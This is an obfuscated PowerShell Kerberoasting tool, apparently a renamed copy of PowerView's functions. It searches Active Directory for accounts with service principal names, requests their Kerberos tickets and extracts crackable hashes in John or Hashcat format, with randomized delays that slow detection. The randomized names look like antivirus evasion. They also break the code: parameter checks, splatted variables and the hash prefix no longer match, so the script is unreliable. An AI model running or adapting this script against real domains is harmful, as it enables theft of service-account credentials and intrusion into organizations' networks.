function equities {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $fyfUSwpT99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LTyNzfjH99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tJYuZjII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $qtAtuANT99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NEwucVeH99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $IICeSVjm99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $owmIMmXw99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $aKEAJjrS99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $RgkYpgRP99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $khJqRKQc99,
        [Switch]
        $LEOGWBCE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $qiqcoRCT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $pVYIDZUT99 = $fyfUSwpT99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $kHxEdSse99 = veins -qiqcoRCT99 $qiqcoRCT99
            }
            else {
                $kHxEdSse99 = veins
            }
            $pVYIDZUT99 = $kHxEdSse99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($kHxEdSse99) {
                    $LQxNGKjA99 = $kHxEdSse99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $LQxNGKjA99 = ((veins -qiqcoRCT99 $qiqcoRCT99).PdcRoleOwner).Name
                }
                else {
                    $LQxNGKjA99 = ((veins).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[equities] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $LQxNGKjA99 = $IICeSVjm99
        }
        $phjrQyCc99 = 'LDAP://'
        if ($LQxNGKjA99 -and ($LQxNGKjA99.Trim() -ne '')) {
            $phjrQyCc99 += $LQxNGKjA99
            if ($pVYIDZUT99) {
                $phjrQyCc99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $phjrQyCc99 += $NEwucVeH99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($qtAtuANT99 -Match '^GC://') {
                $DN = $qtAtuANT99.ToUpper().Trim('/')
                $phjrQyCc99 = ''
            }
            else {
                if ($qtAtuANT99 -match '^LDAP://') {
                    if ($qtAtuANT99 -match "LDAP://.+/.+") {
                        $phjrQyCc99 = ''
                        $DN = $qtAtuANT99
                    }
                    else {
                        $DN = $qtAtuANT99.SubString(7)
                    }
                }
                else {
                    $DN = $qtAtuANT99
                }
            }
        }
        else {
            if ($pVYIDZUT99 -and ($pVYIDZUT99.Trim() -ne '')) {
                $DN = "DC=$($pVYIDZUT99.Replace('.', ',DC='))"
            }
        }
        $phjrQyCc99 += $DN
        Write-Verbose "[equities] search string: $phjrQyCc99"
        if ($qiqcoRCT99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[equities] Using alternate credentials for LDAP connection"
            $kHxEdSse99 = New-Object DirectoryServices.DirectoryEntry($phjrQyCc99, $qiqcoRCT99.UserName, $qiqcoRCT99.GetNetworkCredential().Password)
            $bBvsCpNr99 = New-Object System.DirectoryServices.DirectorySearcher($kHxEdSse99)
        }
        else {
            $bBvsCpNr99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$phjrQyCc99)
        }
        $bBvsCpNr99.PageSize = $aKEAJjrS99
        $bBvsCpNr99.SearchScope = $owmIMmXw99
        $bBvsCpNr99.CacheResults = $False
        $bBvsCpNr99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $bBvsCpNr99.ServerTimeLimit = $RgkYpgRP99
        }
        if ($PSBoundParameters['Tombstone']) {
            $bBvsCpNr99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $bBvsCpNr99.filter = $LTyNzfjH99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $bBvsCpNr99.SecurityMasks = Switch ($khJqRKQc99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $CWlUXbpE99 = $tJYuZjII99| ForEach-Object { $_.Split(',') }
            $Null = $bBvsCpNr99.PropertiesToLoad.AddRange(($CWlUXbpE99))
        }
        $bBvsCpNr99
    }
}
function differing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $tJYuZjII99
    )
    $YyYyqzVj99 = @{}
    $tJYuZjII99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $YyYyqzVj99[$_] = $tJYuZjII99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $YyYyqzVj99[$_] = $tJYuZjII99[$_][0] -as $hAvMTbwE99
            }
            elseif ($_ -eq 'samaccounttype') {
                $YyYyqzVj99[$_] = $tJYuZjII99[$_][0] -as $XMNmpCwN99
            }
            elseif ($_ -eq 'objectguid') {
                $YyYyqzVj99[$_] = (New-Object Guid (,$tJYuZjII99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $YyYyqzVj99[$_] = $tJYuZjII99[$_][0] -as $CTIcnCtQ99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $oJZVDSXy99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $tJYuZjII99[$_][0], 0
                if ($oJZVDSXy99.Owner) {
                    $YyYyqzVj99['Owner'] = $oJZVDSXy99.Owner
                }
                if ($oJZVDSXy99.Group) {
                    $YyYyqzVj99['Group'] = $oJZVDSXy99.Group
                }
                if ($oJZVDSXy99.DiscretionaryAcl) {
                    $YyYyqzVj99['DiscretionaryAcl'] = $oJZVDSXy99.DiscretionaryAcl
                }
                if ($oJZVDSXy99.SystemAcl) {
                    $YyYyqzVj99['SystemAcl'] = $oJZVDSXy99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($tJYuZjII99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $YyYyqzVj99[$_] = "NEVER"
                }
                else {
                    $YyYyqzVj99[$_] = [datetime]::fromfiletime($tJYuZjII99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($tJYuZjII99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $tJYuZjII99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $YyYyqzVj99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $YyYyqzVj99[$_] = ([datetime]::FromFileTime(($tJYuZjII99[$_][0])))
                }
            }
            elseif ($tJYuZjII99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $tJYuZjII99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $YyYyqzVj99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[differing] error: $_"
                    $YyYyqzVj99[$_] = $Prop[$_]
                }
            }
            elseif ($tJYuZjII99[$_].count -eq 1) {
                $YyYyqzVj99[$_] = $tJYuZjII99[$_][0]
            }
            else {
                $YyYyqzVj99[$_] = $tJYuZjII99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $YyYyqzVj99
    }
    catch {
        Write-Warning "[differing] Error parsing LDAP properties : $_"
    }
}
function veins {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $fyfUSwpT99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $qiqcoRCT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[veins] Using alternate credentials for veins'
            if ($PSBoundParameters['Domain']) {
                $pVYIDZUT99 = $fyfUSwpT99
            }
            else {
                $pVYIDZUT99 = $qiqcoRCT99.GetNetworkCredential().Domain
                Write-Verbose "[veins] Extracted domain '$pVYIDZUT99' from -qiqcoRCT99"
            }
            $NhWSDIhT99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $pVYIDZUT99, $qiqcoRCT99.UserName, $qiqcoRCT99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($NhWSDIhT99)
            }
            catch {
                Write-Verbose "[veins] The specified domain '$pVYIDZUT99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $NhWSDIhT99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $fyfUSwpT99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($NhWSDIhT99)
            }
            catch {
                Write-Verbose "[veins] The specified domain '$fyfUSwpT99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[veins] Error retrieving the current domain: $_"
            }
        }
    }
}
function congestion {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $uBWNKhEv99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $YxxWeXoD99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $qiqcoRCT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $oDEMqIor99 = Invoke-UserImpersonation -qiqcoRCT99 $qiqcoRCT99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $mmAgTTZS99 = $User
        }
        else {
            $mmAgTTZS99 = $SPN
        }
	
	$RMBWUgqM99 = New-Object System.Random
        ForEach ($Object in $mmAgTTZS99) {
            if ($PSBoundParameters['User']) {
                $GUhcxPqz99 = $Object.ServicePrincipalName
                $LocUarTV99 = $Object.SamAccountName
                $YsIYMFgk99 = $Object.DistinguishedName
            }
            else {
                $GUhcxPqz99 = $Object
                $LocUarTV99 = 'UNKNOWN'
                $YsIYMFgk99 = 'UNKNOWN'
            }
            if ($GUhcxPqz99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $GUhcxPqz99 = $GUhcxPqz99[0]
            }
            try {
                $RtQEQlIz99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $GUhcxPqz99
            }
            catch {
                Write-Warning "[congestion] Error requesting ticket for SPN '$GUhcxPqz99' from user '$YsIYMFgk99' : $_"
            }
            if ($RtQEQlIz99) {
                $UDxTiltu99 = $RtQEQlIz99.GetRequest()
            }
            if ($UDxTiltu99) {
                $Out = New-Object PSObject
                $KMyjicPW99 = [System.BitConverter]::ToString($UDxTiltu99) -replace '-'
                if($KMyjicPW99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $xyglKiEe99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $bEmKbwId99 = $Matches.DataToEnd.Substring(0,$xyglKiEe99*2)
                    if($Matches.DataToEnd.Substring($xyglKiEe99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($RtQEQlIz99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($UDxTiltu99).Replace('-',''))
                    } else {
                        $Hash = "$($bEmKbwId99.Substring(0,32))`$$($bEmKbwId99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($RtQEQlIz99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($UDxTiltu99).Replace('-',''))
                }
                if($Hash) {
                    if ($uBWNKhEv99 -match 'John') {
                        $doSNmIjm99 = "`$oIYFnnOO99`$$($RtQEQlIz99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($YsIYMFgk99 -ne 'UNKNOWN') {
                            $CpeodroD99 = $YsIYMFgk99.SubString($YsIYMFgk99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $CpeodroD99 = 'UNKNOWN'
                        }
                        $doSNmIjm99 = "`$oIYFnnOO99`$$($Etype)`$*$LocUarTV99`$$CpeodroD99`$$($RtQEQlIz99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $doSNmIjm99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $LocUarTV99
                $Out | Add-Member Noteproperty 'DistinguishedName' $YsIYMFgk99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $RtQEQlIz99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $RMBWUgqM99.Next((1-$YxxWeXoD99)*$Delay, (1+$YxxWeXoD99)*$Delay)
        }
    }
    END {
        if ($oDEMqIor99) {
            Invoke-RevertToSelf -TokenHandle $oDEMqIor99
        }
    }
}
function reduce {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $inofGVDE99,
        [Switch]
        $SPN,
        [Switch]
        $LsyifWDQ99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $ReCzwyTi99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $XoKiKbwe99,
        [Switch]
        $oPGrNvkE99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $STQHKijd99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fyfUSwpT99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LTyNzfjH99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tJYuZjII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $qtAtuANT99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $IICeSVjm99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $owmIMmXw99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $aKEAJjrS99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $RgkYpgRP99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $khJqRKQc99,
        [Switch]
        $LEOGWBCE99,
        [Alias('ReturnOne')]
        [Switch]
        $hdnZASMb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $qiqcoRCT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $uDivosdY99 = @{}
        if ($PSBoundParameters['Domain']) { $uDivosdY99['Domain'] = $fyfUSwpT99 }
        if ($PSBoundParameters['Properties']) { $uDivosdY99['Properties'] = $tJYuZjII99 }
        if ($PSBoundParameters['SearchBase']) { $uDivosdY99['SearchBase'] = $qtAtuANT99 }
        if ($PSBoundParameters['Server']) { $uDivosdY99['Server'] = $IICeSVjm99 }
        if ($PSBoundParameters['SearchScope']) { $uDivosdY99['SearchScope'] = $owmIMmXw99 }
        if ($PSBoundParameters['ResultPageSize']) { $uDivosdY99['ResultPageSize'] = $aKEAJjrS99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $uDivosdY99['ServerTimeLimit'] = $RgkYpgRP99 }
        if ($PSBoundParameters['SecurityMasks']) { $uDivosdY99['SecurityMasks'] = $khJqRKQc99 }
        if ($PSBoundParameters['Tombstone']) { $uDivosdY99['Tombstone'] = $LEOGWBCE99 }
        if ($PSBoundParameters['Credential']) { $uDivosdY99['Credential'] = $qiqcoRCT99 }
        $VCPysRdy99 = equities @SearcherArguments
    }
    PROCESS {
        if ($VCPysRdy99) {
            $EahMbHQW99 = ''
            $gZorfwmg99 = ''
            $inofGVDE99 | Where-Object {$_} | ForEach-Object {
                $HuQdGVKR99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($HuQdGVKR99 -match '^S-1-') {
                    $EahMbHQW99 += "(objectsid=$HuQdGVKR99)"
                }
                elseif ($HuQdGVKR99 -match '^CN=') {
                    $EahMbHQW99 += "(distinguishedname=$HuQdGVKR99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $vmhIqogV99 = $HuQdGVKR99.SubString($HuQdGVKR99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[reduce] Extracted domain '$vmhIqogV99' from '$HuQdGVKR99'"
                        $uDivosdY99['Domain'] = $vmhIqogV99
                        $VCPysRdy99 = equities @SearcherArguments
                        if (-not $VCPysRdy99) {
                            Write-Warning "[reduce] Unable to retrieve domain searcher for '$vmhIqogV99'"
                        }
                    }
                }
                elseif ($HuQdGVKR99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $tyszSgrQ99 = (([Guid]$HuQdGVKR99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $EahMbHQW99 += "(objectguid=$tyszSgrQ99)"
                }
                elseif ($HuQdGVKR99.Contains('\')) {
                    $sCNotlrp99 = $HuQdGVKR99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($sCNotlrp99) {
                        $CpeodroD99 = $sCNotlrp99.SubString(0, $sCNotlrp99.IndexOf('/'))
                        $WIXhjNJN99 = $HuQdGVKR99.Split('\')[1]
                        $EahMbHQW99 += "(samAccountName=$WIXhjNJN99)"
                        $uDivosdY99['Domain'] = $CpeodroD99
                        Write-Verbose "[reduce] Extracted domain '$CpeodroD99' from '$HuQdGVKR99'"
                        $VCPysRdy99 = equities @SearcherArguments
                    }
                }
                else {
                    $EahMbHQW99 += "(samAccountName=$HuQdGVKR99)"
                }
            }
            if ($EahMbHQW99 -and ($EahMbHQW99.Trim() -ne '') ) {
                $gZorfwmg99 += "(|$EahMbHQW99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[reduce] Searching for non-null service principal names'
                $gZorfwmg99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[reduce] Searching for users who can be delegated'
                $gZorfwmg99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[reduce] Searching for users who are sensitive and not trusted for delegation'
                $gZorfwmg99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[reduce] Searching for adminCount=1'
                $gZorfwmg99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[reduce] Searching for users that are trusted to authenticate for other principals'
                $gZorfwmg99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[reduce] Searching for user accounts that do not require kerberos preauthenticate'
                $gZorfwmg99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[reduce] Using additional LDAP filter: $LTyNzfjH99"
                $gZorfwmg99 += "$LTyNzfjH99"
            }
            $OATSmMBP99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $dftGVGMF99 = $_.Substring(4)
                    $xWkymidy99 = [Int]($CTIcnCtQ99::$dftGVGMF99)
                    $gZorfwmg99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$xWkymidy99))"
                }
                else {
                    $xWkymidy99 = [Int]($CTIcnCtQ99::$_)
                    $gZorfwmg99 += "(userAccountControl:1.2.840.113556.1.4.803:=$xWkymidy99)"
                }
            }
            $VCPysRdy99.filter = "(&(samAccountType=805306368)$gZorfwmg99)"
            Write-Verbose "[reduce] filter string: $($VCPysRdy99.filter)"
            if ($PSBoundParameters['FindOne']) { $jPTUBDXW99 = $VCPysRdy99.FindOne() }
            else { $jPTUBDXW99 = $VCPysRdy99.FindAll() }
            $jPTUBDXW99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = differing -tJYuZjII99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($jPTUBDXW99) {
                try { $jPTUBDXW99.dispose() }
                catch {
                    Write-Verbose "[reduce] Error disposing of the Results object: $_"
                }
            }
            $VCPysRdy99.dispose()
        }
    }
}
function gnawn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $inofGVDE99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fyfUSwpT99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LTyNzfjH99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $qtAtuANT99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $IICeSVjm99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $owmIMmXw99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $aKEAJjrS99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $RgkYpgRP99,
        [Switch]
        $LEOGWBCE99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $YxxWeXoD99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $uBWNKhEv99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $qiqcoRCT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $GWBpSkiJ99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $GWBpSkiJ99['Domain'] = $fyfUSwpT99 }
        if ($PSBoundParameters['LDAPFilter']) { $GWBpSkiJ99['LDAPFilter'] = $LTyNzfjH99 }
        if ($PSBoundParameters['SearchBase']) { $GWBpSkiJ99['SearchBase'] = $qtAtuANT99 }
        if ($PSBoundParameters['Server']) { $GWBpSkiJ99['Server'] = $IICeSVjm99 }
        if ($PSBoundParameters['SearchScope']) { $GWBpSkiJ99['SearchScope'] = $owmIMmXw99 }
        if ($PSBoundParameters['ResultPageSize']) { $GWBpSkiJ99['ResultPageSize'] = $aKEAJjrS99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $GWBpSkiJ99['ServerTimeLimit'] = $RgkYpgRP99 }
        if ($PSBoundParameters['Tombstone']) { $GWBpSkiJ99['Tombstone'] = $LEOGWBCE99 }
        if ($PSBoundParameters['Credential']) { $GWBpSkiJ99['Credential'] = $qiqcoRCT99 }
        if ($PSBoundParameters['Credential']) {
            $oDEMqIor99 = Invoke-UserImpersonation -qiqcoRCT99 $qiqcoRCT99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $GWBpSkiJ99['Identity'] = $inofGVDE99 }
        reduce @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | congestion -Delay $Delay -uBWNKhEv99 $uBWNKhEv99 -YxxWeXoD99 $YxxWeXoD99
    }
    END {
        if ($oDEMqIor99) {
            Invoke-RevertToSelf -TokenHandle $oDEMqIor99
        }
    }
}
